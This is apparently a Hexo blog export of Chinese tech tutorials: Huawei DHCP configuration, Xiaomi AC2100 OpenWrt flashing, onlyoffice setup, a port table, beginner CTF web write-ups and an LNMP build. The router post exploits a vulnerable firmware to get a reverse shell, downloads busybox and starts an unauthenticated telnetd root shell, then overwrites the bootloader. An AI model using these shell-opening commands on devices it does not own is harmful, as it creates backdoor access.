<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中继路由配置</span><br><span class="line">[Huawei] interface g0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] ip address 1.1.1.2 24</span><br><span class="line">[Huawei-GigabitEthernet0/0/0] interface g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] ip address 192.168.3.1 24</span><br><span class="line">[Huawei] dhcp enable </span><br><span class="line">[Huawei] interface g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] dhcp select relay  // 在接口上应用DHCP中继功能</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] dhcp relay server-ip 1.1.1.1  //指向DHCP服务器的IP地址</span><br></pre></td></tr></table></figure>

<h2 id="交换机配置DHCP"><a href="#交换机配置DHCP" class="headerlink" title="交换机配置DHCP"></a>交换机配置DHCP</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092919.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sw1的配置</span><br><span class="line">[Huawei] hcp enable</span><br><span class="line">[Huawei] ip pool test</span><br><span class="line">[Huawei-ip-pool-test] network 192.168.1.0 mask 24</span><br><span class="line">[Huawei-ip-pool-test] gateway-list 192.168.1.1</span><br><span class="line">[Huawei-ip-pool-test1] dns-list 8.8.8.8</span><br><span class="line">[Huawei-ip-pool-test1] lease day 5</span><br><span class="line">[Huawei] vlan batch 10 20</span><br><span class="line">[Huawei] interface Vlanif 10</span><br><span class="line">[Huawei-Vlanif10] ip address 192.168.1.1 24</span><br><span class="line">[Huawei-Vlanif10] hcp select global</span><br><span class="line">[Huawei] interface Vlanif 20</span><br><span class="line">[Huawei-Vlanif20] ip address 192.168.2.1 24</span><br><span class="line">[Huawei-Vlanif20] dhcp select global </span><br><span class="line">[Huawei-Vlanif20] interface g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port link-type trunk </span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port trunk allow-pass vlan all</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] interface g0/0/2</span><br><span class="line">[Huawei-GigabitEthernet0/0/2] port link-type trunk</span><br><span class="line">[Huawei-GigabitEthernet0/0/2] port trunk allow-pass vlan all</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sw2的配置</span><br><span class="line">[Huawei] vlan batch 10 20</span><br><span class="line">[Huawei] dhcp enable</span><br><span class="line">[Huawei] interface e0/0/1</span><br><span class="line">[Huawei-Ethernet0/0/1] port link-type access</span><br><span class="line">[Huawei-Ethernet0/0/1] port default vlan 10</span><br><span class="line">[Huawei-Ethernet0/0/1] interface g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port link-type trunk</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port trunk allow-pass vlan all</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sw3的配置</span><br><span class="line">[Huawei] vlan batch 10 20</span><br><span class="line">[Huawei] dhcp enable</span><br><span class="line">[Huawei] interface g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port link-type trunk</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] port trunk allow-pass vlan all</span><br><span class="line">[Huawei-GigabitEthernet0/0/1] interface e0/0/2</span><br><span class="line">[Huawei-Ethernet0/0/2] port link-type access</span><br><span class="line">[Huawei-Ethernet0/0/2] port default vlan 20</span><br></pre></td></tr></table></figure>

<p>正常的话两个pc之间互相ping通。</p>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>DHCP配置</tag>
      </tags>
  </entry>
  <entry>
    <title>小米和红米AC2100使用Breed刷Openwrt</title>
    <url>/archives/30fd5510.html</url>
    <content><![CDATA[<p>手里的小米AC2100路由器入手已经快一年了，之前一直是作为软路由下的二级路由使用，原来的软路由是旧台式主机做的，声音一直很大，功率也不低，于是考虑把小米路由器刷成软路由。中间也是百般出错，花费了大半天时间，终于完成，目前稳定性还没有测试，记录一下安装过程。</p>
<span id="more"></span>

<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>首先是把小米路由器恢复出厂设置，并把路由器版本恢复到有漏洞的版本，我这里恢复的是2.03版本，版本链接会在文章末尾贴出来，用2.7版本的话到反弹shell那个地方会出现，脚本错误，结尾是NoneType has no len（）。我就是被这个坑了大半天时间。恢复步骤看下面图片：</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/ac2100-5.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/ac2100-6.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/ac2100-9.png"></p>
<p>至此版本恢复完成。</p>
<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>1.用一键telnet脚本，开启小米路由器telnet功能，我电脑本身开着telnet所以不用再开启了，如果电脑没有开启telnet功能的，需要开启，至于开启方法百度搜索吧。</p>
<p>2.按照脚本要求需要把电脑的除了连路由器的网卡，其余的全部禁用，并把网卡地址改为192.168.31.177，网关改为192.168.31.1，关掉电脑防火墙，及杀毒软件。</p>
<p>3.接下来就是路由器侧，需要把wan口连接跟wan口紧挨着的lan口，然后再把从上面向下数第二个网口连接电脑网口。</p>
<p>4.登录路由器后台，设置上网方式位PPOE，设置用户名123，密码123，点击拨号，然后打开一键telnet脚本，回车会看到PPOE服务的包，再返回到一键telnet脚本输入y，会出现反弹的shell，复制开启telnet命令，粘贴进去并回车，开启telnet命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp&amp;&amp;wget http://192.168.31.177:8081/busybox&amp;&amp;chmod a+x ./busybox&amp;&amp;./busybox telnetd -l /bin/sh</span><br></pre></td></tr></table></figure>

<p>接下来，打开一个cmd窗口，输入命令telnet 192.168.31.1，前面都没问题的话，会成功连接路由器，接下来开始刷breed后台。命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.31.177:8081/breed-mt7621-xiaomi-r3g.bin&amp;&amp;nvram set uart_en=1&amp;&amp;nvram set bootdelay=5&amp;&amp;nvram set flag_try_sys1_failed=1&amp;&amp;nvram commit</span><br><span class="line">mtd -r write breed-mt7621-xiaomi-r3g.bin Bootloader</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就是等待路由器重启。重启完成之后把电脑网卡设置为自动获取。接下来就可以登录到breed后台了。</p>
<p>下面是其中几张截图：</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/ac2100-8.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/ac2100-10.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/QQ%E6%88%AA%E5%9B%BE20201019145404.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/QQ%E6%88%AA%E5%9B%BE20201019145624.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/QQ%E6%88%AA%E5%9B%BE20201019150040.png"></p>
<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>重点来了，接下来就是刷入固件，这里用的是恩山大佬提供的【1009多功能版OpenWrt】。<br>首先需要在breed后台，选择环境变量编辑，输入字段xiaomi.r3g.bootfw，值为2，并保存，再选择固件更新上传固件文件，大佬说的是用breed刷openwrt的话需要先安装过渡文件再在安装之后的后台上传需要的版本升级，一下几张图提供参考：</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/QQ%E6%88%AA%E5%9B%BE20201019150209.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/QQ%E6%88%AA%E5%9B%BE20201019150231.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/QQ%E6%88%AA%E5%9B%BE20201019150501.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/AC2100/QQ%E6%88%AA%E5%9B%BE20201019150532.png"></p>
<p>至此软路由安装算是完成了，有人说小米ac2100刷这个固件会出现一个网口不能使用，我这边测试一下并没有发现这个问题。</p>
<h2 id="刷回官方固件"><a href="#刷回官方固件" class="headerlink" title="刷回官方固件"></a>刷回官方固件</h2><p>官网有恢复工具，步骤也比较简单，这里不再演示。。<br>官网软件下载地址：<a href="http://www.miwifi.com/miwifi_download.html">http://www.miwifi.com/miwifi_download.html</a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>本文用的openwrt固件：<a href="https://www.right.com.cn/FORUM/thread-4019555-1-1.html">https://www.right.com.cn/FORUM/thread-4019555-1-1.html</a></p>
<p>breed后台：<a href="https://www.right.com.cn/forum/forum.php?mod=viewthread&amp;tid=161906">https://www.right.com.cn/forum/forum.php?mod=viewthread&amp;tid=161906</a></p>
<p>小米路由器版本: <a href="http://bigota.miwifi.com/xiaoqiang/rom/r2100/miwifi_r2100_firmware_64288_2.0.376.bin">http://bigota.miwifi.com/xiaoqiang/rom/r2100/miwifi_r2100_firmware_64288_2.0.376.bin</a></p>
]]></content>
      <categories>
        <category>Openwrt</category>
      </categories>
      <tags>
        <tag>软路由</tag>
        <tag>Openwrt</tag>
      </tags>
  </entry>
  <entry>
    <title>局域网搭建onlyoffice</title>
    <url>/archives/2d66eba4.html</url>
    <content><![CDATA[<p>在日常工作中免不了有多人在线同时编辑的需求，看了一部分相关软件，觉得dzzoffice比较符合需求，搭建环境依旧是centos7，onlyoffice是部署在docker中。</p>
<span id="more"></span>
<h1 id="安装dzzoffice"><a href="#安装dzzoffice" class="headerlink" title="安装dzzoffice"></a>安装dzzoffice</h1><ul>
<li>官网地址：<a href="http://www.dzzoffice.com/">http://www.dzzoffice.com/</a></li>
</ul>
<h2 id="centos7安装"><a href="#centos7安装" class="headerlink" title="centos7安装"></a>centos7安装</h2><h3 id="LAMP安装"><a href="#LAMP安装" class="headerlink" title="LAMP安装"></a>LAMP安装</h3><ul>
<li>LAMP环境部署</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y httpd php php-mysql</span><br></pre></td></tr></table></figure>
<p>至于修改配置文件什么的这里不再介绍，上篇的部署环境跟这个差不多。</p>
<h2 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h2><ul>
<li>进入到/var/www/html/目录下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">wget https://github.com/zyx0814/dzzoffice/archive/2.02.tar.gz</span><br></pre></td></tr></table></figure>
<ul>
<li>解压tar包</li>
</ul>
<p><code>tar -zxvf dzzoffice-2.02.tar.gz</code></p>
<ul>
<li>修改目录权限</li>
</ul>
<p><code>chown -R apache. /var/www/html/dzzoffice-2.02</code></p>
<ul>
<li>访问web页面进行安装</li>
</ul>
<p><code>http://你部署的IP地址/dzzoffice</code></p>
<p>跟随提示安装即可，如果却依赖包，直接yum安装就可以。</p>
<p>随后就是在应用商店安装你所需要的应用。</p>
<h1 id="onlyoffice的配置"><a href="#onlyoffice的配置" class="headerlink" title="onlyoffice的配置"></a>onlyoffice的配置</h1><p>这里选择的是docker部署服务端。docker安装请参考<a href="https://vkali.com/archives/ce06018d.html#more" title="Centos7安装docker和docker-compose">Centos7安装docker和docker-compose</a><br>这里不做详细介绍。</p>
<ul>
<li>拉取onlyoffice镜像</li>
</ul>
<p><code>docker pull onlyoffice/documentserver</code></p>
<ul>
<li>运行onlyoffice镜像</li>
</ul>
<p><code>docker run -i -t -d -p [PORT_NUMBER]:80 --restart=always onlyoffice/documentserver</code></p>
<ul>
<li>查看是否成功</li>
</ul>
<p>访问你所部署的IP地址，出现welcome页面，即安装完成。</p>
<h1 id="实现在线编辑"><a href="#实现在线编辑" class="headerlink" title="实现在线编辑"></a>实现在线编辑</h1><p>在dzzoffice后台，选择onlyoffice编辑设置。<br>在onlyoffice document server API 这一栏，填上你docker部署的onlyoffice的API地址，目前的路径为：</p>
<p><code>http://IP地址:端口号/6.0.2-5/web-apps/apps/api/documents/api.js</code></p>
<p>接下来就可以实现同时在线编辑的功能了。部署过程中有任何疑问或者问题，欢迎留言交流。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>dzzoffice</tag>
        <tag>onlyoffice</tag>
      </tags>
  </entry>
  <entry>
    <title>常用服务及默认端口</title>
    <url>/archives/5fcc8c8e.html</url>
    <content><![CDATA[<p>收集了一些常见默认的服务端口，也不是特别的全，以后慢慢的补充吧。</p>
<span id="more"></span>

<table>
<thead>
<tr>
<th>服务名称</th>
<th align="center">默认端口</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td>ssh</td>
<td align="center">22</td>
<td align="right">远程登录协议</td>
</tr>
<tr>
<td>telnet</td>
<td align="center">23</td>
<td align="right">远程登录及控制</td>
</tr>
<tr>
<td>ftp</td>
<td align="center">21</td>
<td align="right">文件传输协议，用于文件上传和下载</td>
</tr>
<tr>
<td>http</td>
<td align="center">80</td>
<td align="right">超文本传输协议</td>
</tr>
<tr>
<td>https</td>
<td align="center">443</td>
<td align="right">加密传输</td>
</tr>
<tr>
<td>smtp</td>
<td align="center">25</td>
<td align="right">简单邮件传输协议</td>
</tr>
<tr>
<td>pop3</td>
<td align="center">110</td>
<td align="right">用于接收电子邮件</td>
</tr>
<tr>
<td>smb</td>
<td align="center">139/445</td>
<td align="right">文件共享</td>
</tr>
<tr>
<td>rdp</td>
<td align="center">3389</td>
<td align="right">Windows远程桌面</td>
</tr>
<tr>
<td>snmp</td>
<td align="center">161</td>
<td align="right">简单网络管理协议</td>
</tr>
<tr>
<td>ldap</td>
<td align="center">389</td>
<td align="right">轻量目录访问协议</td>
</tr>
<tr>
<td>socks</td>
<td align="center">1080</td>
<td align="right">socks代理</td>
</tr>
<tr>
<td>dns</td>
<td align="center">53</td>
<td align="right">域名服务</td>
</tr>
<tr>
<td>tftp</td>
<td align="center">69</td>
<td align="right">简单文件传输协议</td>
</tr>
<tr>
<td>vnc</td>
<td align="center">5900</td>
<td align="right">远程桌面</td>
</tr>
<tr>
<td>ntp</td>
<td align="center">123</td>
<td align="right">网络时间协议</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界web答题新手练习题</title>
    <url>/archives/3230df5f.html</url>
    <content><![CDATA[<p>前段事件做了一些简单的CTF题，在此简单记录一下，防止忘记了。</p>
<span id="more"></span>

<h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>这一题比较简单，查看网页源码得到flag。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/flag_is_not_here.png"></p>
<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>看题目得知是robots文件，直接用御剑扫描后台可以看到。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/robots.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/robots1.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/robots3.png"> </p>
<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>这一题看题目一般备份文件习惯性后缀为bak，这里也是用御剑扫描后台，得到路径下载下来，用Notepad++打开得到falg。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/backup.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/buckup1.png"></p>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>这一题是cookie题，推荐用火狐浏览器打开。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/cookie.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/cookie1.png"></p>
<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>disabled属性规定应该是禁用input元素，被禁用的元素是无法使用和点击，删除源码中的disable属性，点击可获得flag。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/button.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/button1.png"> </p>
<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>这一题是字典爆破。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/bp.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/bp1.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/bp3.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/bp4.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/bp5.png"></p>
<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p>这一题是命令执行漏洞 windows 或 linux 下: command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2 command1 command2 只执行 command2 command1 &amp; command2 先执行 command2 后执行 command1 command1 command2 先执行 command1，如果为假，再执行 command2 命令执行漏洞（ &amp; &amp;&amp; 称为 管道符） </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/ping.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/ping1.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/ping3.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/ping4.png"> </p>
<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/get.png"></p>
<h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/post.png"> </p>
<h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/xff.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/xff1.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/referer.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/referer1.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/referer3.png"></p>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/web.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/web1.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/web3.png"> </p>
<h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>javascript的代码审计</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/%E5%AE%A1%E8%AE%A1.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/%E5%AE%A1%E8%AE%A11.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>源码编译搭建LNMP平台</title>
    <url>/archives/fc4f16b3.html</url>
    <content><![CDATA[<p>好久没有搭建LNMP环境了，最近用一台闲置的服务器用目前最新的版本搭建了一下比较基础LNMP环境，在此记录一下。</p>
<span id="more"></span>

<p>软件版本：<a href="https://nginx.org/en/download.html" title="NGINX">NGINX</a>-1.16.0,<br><a href="https://dev.mysql.com/downloads/mysql/" title="MySQL">MySQL</a>-8.0.17，<br><a href="https://www.php.net/downloads.php" title="PHP">PHP</a>-7.3.8</p>
<h2 id="NGINX"><a href="#NGINX" class="headerlink" title="NGINX"></a>NGINX</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget wget http://nginx.org/download/nginx-1.16.0.tar.gz</span><br><span class="line">tar -zxvf nginx-1.16.0.tar.gz</span><br><span class="line">cd nginx-1.16.0</span><br><span class="line">useradd -s  /usr/sbin/nologin nginx</span><br><span class="line">./configure --user=nginx --group=nginx --with-http_ssl_module</span><br><span class="line">// 这里我并没有指定路径，不过还好，默认的路径就是/usr/local/下</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>在我做这些的时候并没有抱任何错误，这里提醒一下，我用的是阿里的云主机，默认开启http服务，要启动NGINX需要关闭httpd服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop httpd</span><br><span class="line">ln -s /usr/local/nginx/sbin/nginx  nginx  </span><br><span class="line">//此处是做了一个软连接</span><br><span class="line">/nginx  //启动服务  //-s reload 重新加载配置文件 // -s stop 关闭服务  //-V 查看版本信息</span><br><span class="line">netstat -anptu  grep nginx //看到80端口上运行的是nginx</span><br><span class="line">curl http://127.0.0.1 //可以看到nginx默认界面</span><br></pre></td></tr></table></figure>

<p>到此nginx暂时告一段落</p>
<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p><a href="https://dev.mysql.com/downloads/mysql/" title="MySQL">MySQL</a>我下载的是所有rpm包的那个压缩包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-8.0.17-1.el7.x86_64.rpm-bundle.tar</span><br><span class="line">tar -xf mysql-8.0.17-1.el7.x86_64.rpm-bundle.tar</span><br><span class="line">yum -y install  mysql-community-*</span><br><span class="line">systemctl start mysqld</span><br><span class="line">cat /var/log/mysqld.log //找到root@localhost这个字段后面就是密码</span><br><span class="line">mysql -uroot -p&#x27;上面找到的密码&#x27;</span><br></pre></td></tr></table></figure>

<p>此处说一下，启动完mysql，登录的时候会发现需要输入密码，它的密码实在日志文件里。</p>
<p>还要说的一点是由于mysql密码认证的问题，需要把mysql的配置文件中<code>default-authentication-plugin=mysql_native_password</code>这个字段前面#去掉，否则的话在后面测试PHP连接MySQL会报一个关于密码认证的错误。像下面这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli::__construct(): The server requested authentication method unknown to the client [caching_sha2_password] </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br><span class="line">mysql -uroot -p&#x27;上面找到的密码&#x27;</span><br><span class="line">set global validate_password.length=8;  //设置密码的长度</span><br><span class="line">set global validate_password.policy=0;</span><br><span class="line">alter user root@&#x27;localhost&#x27; identified with mysql_native_password by &#x27;新密码&#x27;；</span><br><span class="line">flush privileges;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>到此mysql就算是基本完成了。</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p><a href="https://www.php.net/downloads.php" title="PHP">PHP</a>这个版本已经集成了php-fpm这个模块了，编译安装的时候把这个模块加载上就可以了。不过这里需要安装一个依赖包。还有就是加载一下mysqli这个模块,后面测试连接mysql会用到。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install libxml2-devel</span><br><span class="line"> ./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc/ --enable-fpm --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">cd /usr/local/php/etc</span><br><span class="line">cp php-fpm.conf.default php-fpm.conf</span><br><span class="line">cd php-fpm.d/</span><br><span class="line">cp www.conf.default www.conf</span><br><span class="line">cp -f /packages/php-7.3.8/php.ini-production /usr/local/php/etc/php.ini //这里php.ini-production是在源码包里</span><br><span class="line">/usr/local/php/sbin/php-fpm //启动php-fpm</span><br><span class="line">yum -y install php-mysql</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li>修改nginx的配置文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /usr/local/nginx/conf/nginx.conf</span><br><span class="line">    location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.php index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">    //加入 index.php</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">            root           html;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">            include        fastcgi.conf;</span><br><span class="line">        &#125;</span><br><span class="line">    // 取消前面的注释，修改include</span><br><span class="line">    wq //保存退出</span><br><span class="line">    /nginx -s reload // 重新加载一下配置文件</span><br><span class="line">    vim /usr/local/nginx/html/index.php //先测试一下PHP页面是否正常解析</span><br><span class="line">    &lt;?php</span><br><span class="line">    phpinfo();</span><br><span class="line">    ?&gt;</span><br><span class="line">    wq //保存退出</span><br></pre></td></tr></table></figure>
<pre><code>用浏览器访问一下看一下页面信息，我的是阿里云主机，所以需要在阿里控制台的安全规则下开放下80端口。 接下来测试一下PHP连接MySQL数据库执行一下sql查询。

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /usr/local/nginx/html/mysql.php</span><br><span class="line">&lt;?php</span><br><span class="line">$mysqli = new mysqli(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;密码&#x27;,&#x27;mysql&#x27;);</span><br><span class="line">if (mysqli_connect_error())&#123;</span><br><span class="line">    die(&#x27;Unable to connect !&#x27;). mysql_connect_error();</span><br><span class="line">&#125;</span><br><span class="line">$sql = &quot;select * from user&quot;;</span><br><span class="line">$result = $mysqli-&gt;query($sql);</span><br><span class="line">while($row = $result-&gt;fetch_array())&#123;</span><br><span class="line">    printf(&quot;Host:%s&quot;,$row[0]);</span><br><span class="line">    printf(&quot;&lt;/br&gt;&quot;);</span><br><span class="line">    printf(&quot;Name:%s&quot;,$row[1]);</span><br><span class="line">    printf(&quot;&lt;/br&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">wq //保存退出</span><br><span class="line">用浏览器访问一下mysql.php出现下面这些值证明连接成功：</span><br><span class="line">Host:localhost</span><br><span class="line">Name:mysql.infoschema</span><br><span class="line">Host:localhost</span><br><span class="line">Name:mysql.session</span><br><span class="line">Host:localhost</span><br><span class="line">Name:mysql.sys</span><br><span class="line">Host:localhost</span><br><span class="line">Name:root</span><br></pre></td></tr></table></figure>
</code></pre>
<p>测试完成之后基本LNMP环境就算是搭建完成了，接下来就是优化了。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>lnmp</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一次phpipam使用中的报错解决办法</title>
    <url>/archives/df1237de.html</url>
    <content><![CDATA[<p>这次不知道是升级的问题，还是phpipam出现的bug，我这里选择的是全新安装的phpipam，只不过用的是原来旧的数据库，出现了不能录入的问题，版本是1.4.2。</p>
<span id="more"></span>

<h1 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h1><p>在web添加IP地址时出现以下报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">错误，SQLSTATE[23000]:Integrity constraint violation:1048 Column &#x27;is_gateway&#x27; cannot be null</span><br><span class="line"></span><br><span class="line">输入地址错误</span><br></pre></td></tr></table></figure>
<p>这个报错意思是从web页面上看就是网关不能为空，但是这个应该是一个可以选择为空的值，从后端看数据库中is_gateway的值不允许为空。</p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>解决的途径就是修改数据库中允许is_gateway为空。</p>
<ul>
<li>第一步使用phpipam所用的数据库用户名和密码进入数据库</li>
<li>第二步命令如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use phpipam;</span><br><span class="line">show full columns from ipaddresses;</span><br><span class="line">alter table ipaddresses modify is_gateway tiny(1) NULL Default 0;</span><br></pre></td></tr></table></figure>
<ul>
<li>一般在网页重新录入IP地址信息就可以了。</li>
</ul>
]]></content>
      <categories>
        <category>网络与自动化</category>
      </categories>
      <tags>
        <tag>phpipam</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>电脑重装系统或更换电脑如何更新博客（hexo）</title>
    <url>/archives/7abc934a.html</url>
    <content><![CDATA[<p>记录一下电脑重装完系统如何更新博客，由于之前把博客目录都拷贝了出来，重装完系统之后，发现无法更新博客，我的是部署在vps上的，搜了一天，终于找到了解决办法。</p>
<span id="more"></span>

